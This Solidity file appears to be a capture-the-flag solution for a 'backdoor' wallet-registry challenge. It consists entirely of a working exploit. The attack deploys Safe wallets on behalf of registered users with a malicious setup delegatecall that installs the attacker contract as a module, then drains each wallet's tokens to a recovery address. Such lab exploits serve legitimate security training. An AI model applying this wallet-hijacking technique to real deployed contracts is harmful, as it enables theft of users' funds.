// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {Enum} from "@safe-global/safe-smart-account/contracts/common/Enum.sol";

contract AttackContract {
    SafeProxyFactory public immutable walletFactory;
    Safe public immutable singletonCopy;
    WalletRegistry public immutable walletRegistry;
    IERC20 public immutable token;
    address public immutable recovery;
    
    constructor(
        address _walletFactory,
        address _singletonCopy,
        address _walletRegistry,
        address _token,
        address _recovery
    ) {
        walletFactory = SafeProxyFactory(_walletFactory);
        singletonCopy = Safe(payable(_singletonCopy));
        walletRegistry = WalletRegistry(_walletRegistry);
        token = IERC20(_token);
        recovery = _recovery;
    }
    
    function attack(address[] calldata users) external {
        address[] memory createdWallets = new address[](users.length);
        
        // Create all wallets with this contract as a module
        for (uint256 i = 0; i < users.length; i++) {
            address targetUser = users[i];

            // Deploy a setup contract for this specific wallet
            SetupContract setupContract = new SetupContract(address(this));

            // Prepare the owners array for Safe.setup()
            address[] memory owners = new address[](1);
            owners[0] = targetUser;

            // Prepare the initializer data for Safe.setup() with malicious setup
            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector,
                owners,
                1, // threshold
                address(setupContract), // to - our setup contract
                abi.encodeWithSelector(setupContract.enableModule.selector), // data - call enableModule function
                address(0), // fallbackHandler (must be 0 for WalletRegistry)
                address(0), // paymentToken
                0, // payment
                payable(address(0)) // paymentReceiver
            );

            // Create the proxy with callback
            SafeProxy newProxy = walletFactory.createProxyWithCallback(
                address(singletonCopy),
                initializer,
                i + 1, // saltNonce
                walletRegistry
            );

            createdWallets[i] = address(newProxy);
        }
        
        // Drain all tokens from the created wallets
        for (uint256 i = 0; i < createdWallets.length; i++) {
            // Call this contract's drainTokens function through the Safe
            Safe(payable(createdWallets[i])).execTransactionFromModule(
                address(token),
                0,
                abi.encodeWithSelector(
                    token.transfer.selector,
                    recovery,
                    token.balanceOf(createdWallets[i])
                ),
                Enum.Operation.Call
            );
        }
    }
    
    // This function can be called as a module
    function drainTokens(address safe) external {
        uint256 balance = token.balanceOf(safe);
        if (balance > 0) {
            token.transferFrom(safe, recovery, balance);
        }
    }
}

contract SetupContract {
    address public immutable moduleAddress;
    
    constructor(address _moduleAddress) {
        moduleAddress = _moduleAddress;
    }
    
    function enableModule() external {
        // This function will be called via delegatecall during Safe setup
        // Enable the AttackContract as a module
        bytes memory callData = abi.encodeWithSelector(
            bytes4(0x610b5925), // enableModule selector
            moduleAddress
        );
        
        // Call enableModule on the Safe (self call in delegatecall context)
        (bool success,) = address(this).call(callData);
        require(success, "Failed to enable module");
    }
} 